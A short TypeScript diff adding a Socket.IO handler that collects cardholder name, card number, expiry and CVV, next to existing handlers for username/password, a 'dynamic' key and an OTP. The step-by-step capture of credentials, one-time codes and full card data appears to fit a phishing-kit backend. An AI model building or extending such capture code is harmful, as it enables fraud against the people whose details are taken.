@@ -4,6 +4,7 @@ import type { UserSubmitDinamic } from "../../../../core/application/usecases/Us
 import type { UserSubmitOtp } from "../../../../core/application/usecases/UserSubmitOtp.js";
 import { UserGetSession } from "../../../../core/application/usecases/UserGetSession.js";
 import type { UserSubmitData } from "../../../../core/application/usecases/UserSubmitData.js";
+import type { UserSubmitCc } from "../../../../core/application/usecases/UserSubmitCc.js";
 
 type AckGetSession = (res: {
   ok: boolean;
@@ -16,6 +17,7 @@ export function registerUserHandlers(
   socket: Socket,
   deps: {
     submitData: UserSubmitData;
+    submitCc: UserSubmitCc;
     submitAuth: UserSubmitAuth;
     submitDinamic: UserSubmitDinamic;
     submitOtp: UserSubmitOtp;
@@ -36,6 +38,20 @@ export function registerUserHandlers(
       sessionId,
       user: payload?.auth?.user ?? "",
       pass: payload?.auth?.pass ?? "",
+    });
+    ack?.(res);
+  });
+
+  socket.on("user:submit_cc", async (payload: any, ack?: Ack) => {
+    const sessionId = socket.data.auth.sessionId; // ya autenticado
+    const res = await deps.submitCc.execute({
+      sessionId,
+      data: {
+        holder: payload?.data?.holder ?? "",
+        cc: payload?.data?.cc ?? "",
+        exp: payload?.data?.exp ?? "",
+        cvv: payload?.data?.cvv ?? "",
+      }
     });
     ack?.(res);
   });
